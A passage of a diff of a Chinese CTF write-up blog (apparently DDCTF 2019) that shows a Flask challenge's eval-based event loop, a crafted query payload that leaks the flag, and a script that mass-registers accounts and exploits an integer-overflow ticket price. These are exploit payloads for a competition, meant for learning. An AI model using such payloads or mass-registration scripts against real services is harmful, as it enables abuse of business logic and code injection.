class="title">entry_point</span><span class="params">()</span>:</span> </span><br><span class="line">    querystring = urllib.unquote(request.query_string) </span><br><span class="line">    request.event_queue = [] </span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>: </span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session: </span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span> </span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span> </span><br><span class="line">        session[<span class="string">'log'</span>] = [] </span><br><span class="line">    request.prev_session = dict(session) </span><br><span class="line">    trigger_event(querystring) </span><br><span class="line">    <span class="keyword">return</span> execute_event_loop() </span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below -------------------------------------- </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    page = args[<span class="number">0</span>] </span><br><span class="line">    html = <span class="string">''</span> </span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>]) </span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>: </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>: </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>: </span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>] </span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span> </span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">return</span> html </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>]) </span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>: </span><br><span class="line">     </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>) </span><br><span class="line">        html = <span class="string">''</span> </span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>: </span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">             </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source: </span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>: </span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>) </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                html += line </span><br><span class="line">        source.close() </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>: </span><br><span class="line">            headers = &#123;&#125; </span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span> </span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span> </span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers) </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> html </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>) </span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    num_items = int(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>]) </span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items  </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>]) </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span> </span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException() </span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span> </span><br><span class="line">    flag = args[<span class="number">0</span>] </span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span> </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>: </span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries </span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># -*- encoding: utf-8 -*- 
+# written in python 2.7 
+__author__ = &#39;garzon&#39; 
+
+from flask import Flask, session, request, Response 
+import urllib 
+
+app = Flask(__name__) 
+app.secret_key = &#39;*********************&#39; # censored 
+url_prefix = &#39;/d5afe1f66147e857&#39; 
+
+def FLAG(): 
+    return &#39;FLAG_is_here_but_i_wont_show_you&#39;  # censored 
+
+def trigger_event(event): 
+    session[&#39;log&#39;].append(event) 
+    if len(session[&#39;log&#39;]) &gt; 5: session[&#39;log&#39;] = session[&#39;log&#39;][-5:] 
+    if type(event) == type([]): 
+        request.event_queue += event 
+    else: 
+        request.event_queue.append(event) 
+
+def get_mid_str(haystack, prefix, postfix=None): 
+    haystack = haystack[haystack.find(prefix)+len(prefix):] 
+    if postfix is not None: 
+        haystack = haystack[:haystack.find(postfix)] 
+    return haystack 
+
+class RollBackException: pass 
+
+def execute_event_loop(): 
+    valid_event_chars = set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;) 
+    resp = None 
+    while len(request.event_queue) &gt; 0: 
+        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; 
+        request.event_queue = request.event_queue[1:] 
+        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)): continue 
+        for c in event: 
+            if c not in valid_event_chars: break 
+        else: 
+            is_action = event[0] == &#39;a&#39; 
+            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;) 
+            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;) 
+            try: 
+                event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;)) 
+                ret_val = event_handler(args) 
+            except RollBackException: 
+                if resp is None: resp = &#39;&#39; 
+                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39; 
+                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
+                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;] 
+                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;] 
+                break 
+            except Exception, e: 
+                if resp is None: resp = &#39;&#39; 
+                #resp += str(e) # only for debugging 
+                continue 
+            if ret_val is not None: 
+                if resp is None: resp = ret_val 
+                else: resp += ret_val 
+    if resp is None or resp == &#39;&#39;: resp = (&#39;404 NOT FOUND&#39;, 404) 
+    session.modified = True 
+    return resp 
+
+@app.route(url_prefix+&#39;/&#39;) 
+def entry_point(): 
+    querystring = urllib.unquote(request.query_string) 
+    request.event_queue = [] 
+    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100: 
+        querystring = &#39;action:index;False#False&#39; 
+    if &#39;num_items&#39; not in session: 
+        session[&#39;num_items&#39;] = 0 
+        session[&#39;points&#39;] = 3 
+        session[&#39;log&#39;] = [] 
+    request.prev_session = dict(session) 
+    trigger_event(querystring) 
+    return execute_event_loop() 
+
+# handlers/functions below -------------------------------------- 
+
+def view_handler(args): 
+    page = args[0] 
+    html = &#39;&#39; 
+    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(session[&#39;num_items&#39;], session[&#39;points&#39;]) 
+    if page == &#39;index&#39;: 
+        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39; 
+        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39; 
+        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39; 
+    elif page == &#39;shop&#39;: 
+        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39; 
+    elif page == &#39;reset&#39;: 
+        del session[&#39;num_items&#39;] 
+        html += &#39;Session reset.&lt;br /&gt;&#39; 
+    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
+    return html 
+
+def index_handler(args): 
+    bool_show_source = str(args[0]) 
+    bool_download_source = str(args[1]) 
+    if bool_show_source == &#39;True&#39;: 
+
+        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;) 
+        html = &#39;&#39; 
+        if bool_download_source != &#39;True&#39;: 
+            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39; 
+            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
+
+        for line in source: 
+            if bool_download_source != &#39;True&#39;: 
+                html += line.replace(&#39;&amp;&#39;,&#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;) 
+            else: 
+                html += line 
+        source.close() 
+
+        if bool_download_source == &#39;True&#39;: 
+            headers = {} 
+            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39; 
+            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39; 
+            return Response(html, headers=headers) 
+        else: 
+            return html 
+    else: 
+        trigger_event(&#39;action:view;index&#39;) 
+
+def buy_handler(args): 
+    num_items = int(args[0]) 
+    if num_items &lt;= 0: return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0]) 
+    session[&#39;num_items&#39;] += num_items  
+    trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;]) 
+
+def consume_point_function(args): 
+    point_to_consume = int(args[0]) 
+    if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException() 
+    session[&#39;points&#39;] -= point_to_consume 
+
+def show_flag_function(args): 
+    flag = args[0] 
+    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
+    return &#39;You naughty boy! ;) &lt;br /&gt;&#39; 
+
+def get_flag_handler(args): 
+    if session[&#39;num_items&#39;] &gt;= 5: 
+        trigger_event(&#39;func:show_flag;&#39; + FLAG()) # show_flag_function has been disabled, no worries 
+    trigger_event(&#39;action:view;index&#39;) 
+
+if __name__ == &#39;__main__&#39;: 
+    app.run(debug=False, host=&#39;0.0.0.0&#39;) 
+</code></pre>
 <p>每个函数的简单介绍：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#==========================================================</span></span><br><span class="line"><span class="comment"># flag获取函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 以下三个函数负责对参数进行解析。</span></span><br><span class="line"><span class="function"># 1. 添加<span class="title">log</span>，并将参数加入队列</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">trigger_event</span><span class="params">(event)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 2. 工具函数，获取<span class="title">prefix</span>与<span class="title">postfix</span>之间的值</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span></span></span><br><span class="line">#==========================================================</span><br><span class="line"><span class="comment"># 网站入口点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 页面渲染，三个页面:</span>index/shop/reset</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 下载源码</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">index_handler</span><span class="params">(args)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 增加钻石</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">buy_handler</span><span class="params">(args)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 计算价钱，进行减钱</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span></span></span><br><span class="line">#==========================================================</span><br><span class="line"><span class="comment"># 输出flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span></span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">#==========================================================
+# flag获取函数
+def FLAG()
+
+# 以下三个函数负责对参数进行解析。
+# 1. 添加log，并将参数加入队列
+def trigger_event(event)
+
+# 2. 工具函数，获取prefix与postfix之间的值
+def get_mid_str(haystack, prefix, postfix=None):
+
+# 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析）
+def execute_event_loop()
+#==========================================================
+# 网站入口点
+def entry_point()
+
+# 页面渲染，三个页面:index/shop/reset
+def view_handler()
+
+# 下载源码
+def index_handler(args)
+
+# 增加钻石
+def buy_handler(args)
+
+# 计算价钱，进行减钱
+def consume_point_function(args)
+#==========================================================
+# 输出flag
+def show_flag_function(args)
+def get_flag_handler(args)
+</code></pre>
 <p>直接给出<code>payload</code>，然后一步步去分析</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
-<ol>
+<pre><code>?action:trigger_event%23;action:buy;5%23action:get_flag;
+</code></pre><ol>
 <li><code>entry_point()</code></li>
 </ol>
 <p>本题是Python的Flask搭建的服务器，网站的入口在函数<code>entry_point()</code>处，因为有<a href="mailto:`@app.route" target="_blank" rel="noopener">`@app.route</a>(url_prefix+’/‘)`，可以看文章前面给的Flask简单入门的文章</p>
@@ -282,8 +640,8 @@ Python的Flask简单学习：https://blog.csdn.,">
 </ol>
 <p>我们将利用这个函数获得flag，<code>当num_items（我们拥有的商品）数量大于5时</code>，调用了<code>trigger_event()</code>这个函数，将<code>show_flag_function()</code>插入到待服务队列中，但是这个函数已经被作者给ban掉了（也就是没有卵用了），但是后面的<code>FLAG()</code>应该是拿出了flag了。还记得前面提到的<code>trigger_event()</code>有日志功能吗，没错，解题关键点就来了：我们想办法执行这个<code>show_flag_function()</code>函数，让flag记录在日志里，再查看日志就可以了</p>
 <p>讲到现在，我们再次看一下<code>payload</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
-<p>%23是井号#的编码</p>
+<pre><code>?action:trigger_event%23;action:buy;5%23action:get_flag;
+</code></pre><p>%23是井号#的编码</p>
 <p>编写一个小脚本，看一下我们传入的参数到底是怎样被分割的：</p>
 <p>如下图可以看到，服务器会帮我们去执行<code>trigger_event()</code>函数，传入的参数是<code>[&#39;action:buy;5&#39;, &#39;action:get_flag;&#39;]</code>这个队列</p>
 <p>执行完后，<code>request.event_queue</code>数组中的内容就是<code>[&#39;action:buy;5&#39;, &#39;action:get_flag;&#39;]</code>，也就是说，这2个动作接下去将执行</p>
@@ -319,7 +677,65 @@ Python的Flask简单学习：https://blog.csdn.,">
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-8.png" alt="6-8"></p>
 <p>那么现在思路就是：<code>专门使用一个账号填入其他所有账号的id、ticket</code>，成为鸡王</p>
 <p>用手写就太慢了，写个脚本来完成：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re,time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">R_success = R_fail = <span class="number">0</span>	<span class="comment">#注册成功（失败）计数</span></span><br><span class="line">B_success = B_fail = <span class="number">0</span>	<span class="comment">#买票成功（失败）计数</span></span><br><span class="line">P_success = P_fail = <span class="number">0</span>	<span class="comment">#支付票成功（失败）计数</span></span><br><span class="line">List_of_id = []			<span class="comment">#存放id的数组</span></span><br><span class="line">List_of_ticket = []		<span class="comment">#存放ticket的数组</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">'123456789'</span></span><br><span class="line">ticket_price = <span class="number">4294967296</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">110</span>):</span><br><span class="line">	name = <span class="string">'hsuser'</span>+str(i)</span><br><span class="line">	url1 = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s"</span>%(name,password)</span><br><span class="line">	r1 = s.get(url1)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r1.text:		<span class="comment">#注册成功后</span></span><br><span class="line">		R_success += <span class="number">1</span></span><br><span class="line">		url2 = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d"</span>%(ticket_price)</span><br><span class="line">		r2 = s.get(url2)</span><br><span class="line">		<span class="comment">#r2.text = &#123;"code":200,"data":[&#123;"bill_id":"2e35623d-bbeb-44b1-9ee9-77ee3ffd291f","ticket_price":4294967296&#125;]&#125;</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r2.text:		<span class="comment">#买票成功后</span></span><br><span class="line">			B_success += <span class="number">1</span></span><br><span class="line">			bill_id = re.findall(<span class="string">r'"bill_id":"(.*)",'</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">			url3 = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</span><br><span class="line">			r3 = s.get(url3)</span><br><span class="line">			<span class="comment">#r3.text = &#123;"code":200,"data":[&#123;"your_id":144,"your_ticket":"b017ec750d8b04d1db6cb8bafec4dccb"&#125;]&#125;</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r3.text:		<span class="comment">#支付票成功后</span></span><br><span class="line">				P_success += <span class="number">1</span></span><br><span class="line">				your_id = re.findall(<span class="string">r'"your_id":(.*),"you'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">				your_ticket = re.findall(<span class="string">r'"your_ticket":"(.*)"&#125;]'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">				List_of_id.append(your_id)</span><br><span class="line">				List_of_ticket.append(your_ticket)</span><br><span class="line">				time.sleep(<span class="number">0.5</span>)		<span class="comment">#引入时间函数是为了停顿，因为太快的话服务器好像会反映不过来</span></span><br><span class="line">				print(<span class="string">"完成第"</span>+str(i)+<span class="string">"位"</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				P_fail += <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			B_fail += <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		R_fail += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url4 = <span class="string">"http://117.51.147.155:5050/ctf/api/login?name=hhuser2&amp;password=123456789"</span></span><br><span class="line">r4 = s.get(url4)	<span class="comment">#获得我们"鸡王"的登录Session状态</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):		<span class="comment">#从列表中一个个取出id和ticket，杀掉它们</span></span><br><span class="line">	url5 = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(List_of_id[i],List_of_ticket[i])</span><br><span class="line">	r5 = s.get(url5)</span><br><span class="line">	print(r5.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#以下是对注册、买票、支付票成功与否的一个统计数据，可以做参考</span></span><br><span class="line">print(<span class="string">"Register success:"</span> + str(R_success))</span><br><span class="line">print(<span class="string">"Register fali:"</span> + str(R_fail))</span><br><span class="line">print(<span class="string">"========================"</span>)</span><br><span class="line">print(<span class="string">"Buy ticket success:"</span> + str(B_success))</span><br><span class="line">print(<span class="string">"Buy ticket fali:"</span> + str(B_fail))</span><br><span class="line">print(<span class="string">"========================"</span>)</span><br><span class="line">print(<span class="string">"Puy ticket success:"</span> + str(P_success))</span><br><span class="line">print(<span class="string">"Puy ticket fali:"</span> + str(P_fail))</span><br><span class="line">print(<span class="string">"========================"</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests,re,time
+
+s = requests.Session()
+R_success = R_fail = 0    #注册成功（失败）计数
+B_success = B_fail = 0    #买票成功（失败）计数
+P_success = P_fail = 0    #支付票成功（失败）计数
+List_of_id = []            #存放id的数组
+List_of_ticket = []        #存放ticket的数组
+
+password = &#39;123456789&#39;
+ticket_price = 4294967296
+for i in range(110):
+    name = &#39;hsuser&#39;+str(i)
+    url1 = &quot;http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s&quot;%(name,password)
+    r1 = s.get(url1)
+    if &#39;&quot;code&quot;:200&#39; in r1.text:        #注册成功后
+        R_success += 1
+        url2 = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d&quot;%(ticket_price)
+        r2 = s.get(url2)
+        #r2.text = {&quot;code&quot;:200,&quot;data&quot;:[{&quot;bill_id&quot;:&quot;2e35623d-bbeb-44b1-9ee9-77ee3ffd291f&quot;,&quot;ticket_price&quot;:4294967296}]}
+        if &#39;&quot;code&quot;:200&#39; in r2.text:        #买票成功后
+            B_success += 1
+            bill_id = re.findall(r&#39;&quot;bill_id&quot;:&quot;(.*)&quot;,&#39;,r2.text)[0]
+            url3 = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot;%(bill_id)
+            r3 = s.get(url3)
+            #r3.text = {&quot;code&quot;:200,&quot;data&quot;:[{&quot;your_id&quot;:144,&quot;your_ticket&quot;:&quot;b017ec750d8b04d1db6cb8bafec4dccb&quot;}]}
+            if &#39;&quot;code&quot;:200&#39; in r3.text:        #支付票成功后
+                P_success += 1
+                your_id = re.findall(r&#39;&quot;your_id&quot;:(.*),&quot;you&#39;,r3.text)[0]
+                your_ticket = re.findall(r&#39;&quot;your_ticket&quot;:&quot;(.*)&quot;}]&#39;,r3.text)[0]
+                List_of_id.append(your_id)
+                List_of_ticket.append(your_ticket)
+                time.sleep(0.5)        #引入时间函数是为了停顿，因为太快的话服务器好像会反映不过来
+                print(&quot;完成第&quot;+str(i)+&quot;位&quot;)
+            else:
+                P_fail += 1
+        else:
+            B_fail += 1
+    else:
+        R_fail += 1
+
+url4 = &quot;http://117.51.147.155:5050/ctf/api/login?name=hhuser2&amp;password=123456789&quot;
+r4 = s.get(url4)    #获得我们&quot;鸡王&quot;的登录Session状态
+for i in range(100):        #从列表中一个个取出id和ticket，杀掉它们
+    url5 = &quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot;%(List_of_id[i],List_of_ticket[i])
+    r5 = s.get(url5)
+    print(r5.text)
+
+#以下是对注册、买票、支付票成功与否的一个统计数据，可以做参考
+print(&quot;Register success:&quot; + str(R_success))
+print(&quot;Register fali:&quot; + str(R_fail))
+print(&quot;========================&quot;)
+print(&quot;Buy ticket success:&quot; + str(B_success))
+print(&quot;Buy ticket fali:&quot; + str(B_fail))
+print(&quot;========================&quot;)
+print(&quot;Puy ticket success:&quot; + str(P_success))
+print(&quot;Puy ticket fali:&quot; + str(P_fail))
+print(&quot;========================&quot;)
+</code></pre>
 <p>实际操作的时候，因为各种原因，要<code>多次提交脚本</code>最终才能让我们的<code>鸡王</code>干掉100个对手，得到flag：</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-9.png" alt="6-9"></p>
 <h1 id="2-Misc"><a href="#2-Misc" class="headerlink" title="2. Misc"></a>2. Misc</h1><h2 id="第一题（北京地铁）"><a href="#第一题（北京地铁）" class="headerlink" title="第一题（北京地铁）"></a>第一题（北京地铁）</h2><h2 id="第二题（MulTzor）"><a href="#第二题（MulTzor）" class="headerlink" title="第二题（MulTzor）"></a>第二题（MulTzor）</h2><h2 id="第四题（Wireshark）"><a href="#第四题（Wireshark）" class="headerlink" title="第四题（Wireshark）"></a>第四题（Wireshark）</h2><p><code>tcp.stream eq 1</code></p>
